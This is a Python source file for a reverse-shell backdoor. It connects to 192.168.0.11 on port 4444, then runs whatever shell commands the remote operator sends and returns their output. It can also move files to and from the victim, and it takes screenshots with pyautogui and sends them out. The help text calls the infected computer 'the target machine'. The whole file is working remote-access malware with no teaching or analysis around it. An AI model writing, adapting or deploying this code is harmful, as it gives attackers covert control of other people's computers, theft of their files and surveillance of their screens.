import socket
import json
import subprocess
import os
import pyautogui
from termcolor import colored

def data_send(data):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())

def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file):
    f = open(file, 'rb')
    soc.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    soc.settimeout(5)
    chunk = soc.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout as e:
            break
    soc.settimeout(None)
    f.close()

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screen.png')

def shell():
    while True:
        comm = data_recv()
        if comm == "exit":
            break
        if comm == "clear":
            os.system('clear')
        elif comm [:3] == "cd ":
            os.chdir(comm[3:])
        elif comm [:6] == "upload":
            upload_file(comm[7:])
        elif comm [:8] == "download":
            download_file(comm[9:])
        elif comm [:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif comm == "help":
            print(colored('''\n
            exit: close the session on the target machine
            clear: clean the screen from the terminal.
            cd + "directoryname": change the directory on the target machine
            upload + "filename": send a file to the target machine
            download + "filename": download a file from the target machine
            screenshot: takes a screenshot from the target machine
            help: help the user to use the commands.
            '''), 'green')
        else:
            exe = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            rcomm = exe.stdout.read() + exe.stderr.read()
            rcomm = rcomm.decode()
            data_send(rcomm)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('192.168.0.11', 4444))
shell()
